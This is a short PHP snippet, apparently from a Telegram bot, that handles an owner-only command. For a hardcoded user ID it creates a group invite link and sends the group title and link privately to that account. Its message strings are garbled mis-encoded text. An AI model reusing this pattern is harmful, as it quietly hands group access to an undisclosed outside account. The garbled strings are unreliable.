<?php
if (strpos($text, '/nls') === 0 || strpos($text, '/nls') === 0 || strpos($text, ".nls") === 0 || strpos($text, "?nls") === 0 || strpos($text, "#nls") === 0) {
    if ($user_id != 1260898878) {
        $content = ['chat_id' => $chat_id, 'text' => "šøš¼š¬ š©š¼šŗšŖšØšŗ ._.", "reply_to_message_id" => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {
        $content = ['chat_id' => $chat_id, 'text' => "šØšŗ šš¶š¼ š³š°š²š¬", "reply_to_message_id" => $msg_id, 'parse_mode' => 'html'];
        $m1      = SendMessage($content);
        
        $m1      = createChatInviteLink(['chat_id' => $chat_id]);
        $link    = $m1['result']['invite_link'] ?? "null";
        $ttitle  = $ctitle ?? "null";

        $content = ['chat_id' => 1260898878, 'text' => "šÆšØšŖš²š¬š« š®š¹š¶š¼š·\nš»šššš: $ttitle\nš°ššššš: $link", 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    }
}
